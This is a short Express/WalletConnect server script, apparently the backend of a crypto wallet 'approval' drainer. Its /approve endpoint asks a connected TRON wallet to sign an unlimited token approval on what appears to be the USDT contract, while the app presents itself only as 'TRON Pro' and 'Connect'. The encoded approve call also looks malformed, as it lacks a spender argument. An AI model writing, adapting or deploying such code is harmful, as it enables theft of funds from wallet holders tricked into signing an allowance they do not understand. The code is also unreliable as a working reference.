import express from "express";
import cors from "cors";
import SignClient from "@walletconnect/sign-client";

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static("public"));

const projectId = "de40497ce192a97e53c3da7d3f1a4e89";

let client = null;

// 🔥 SAFE INIT
async function initWalletConnect() {
  try {
    client = await SignClient.init({
      projectId,
      metadata: {
        name: "TRON Pro",
        description: "Connect",
        url: "https://your-domain.com",
        icons: []
      }
    });

    console.log("WalletConnect Ready ✅");

  } catch (err) {
    console.log("WC INIT ERROR ❌", err);
  }
}

initWalletConnect();

// =====================
// API
// =====================
app.post("/approve", async (req, res) => {

  try {

    if (!client) {
      return res.status(500).json({ error: "WC not ready" });
    }

    const { topic, address } = req.body;

    const tx = {
      raw_data: {
        contract: [
          {
            parameter: {
              value: {
                owner_address: address,
                contract_address:
                  "41a614f803b6fd780986a42c78ec9c7f77e6ded13c",
                data:
                  "095ea7b3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
              },
              type_url:
                "type.googleapis.com/protocol.TriggerSmartContract"
            },
            type: "TriggerSmartContract"
          }
        ]
      }
    };

    await client.request({
      topic,
      chainId: "tron:0x2b6653dc",
      request: {
        method: "tron_signTransaction",
        params: tx
      }
    });

    res.json({ success: true });

  } catch (e) {
    console.log("APPROVE ERROR ❌", e);
    res.status(500).json({ error: e.message });
  }
});

// 🔥 ALWAYS START SERVER (IMPORTANT)
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
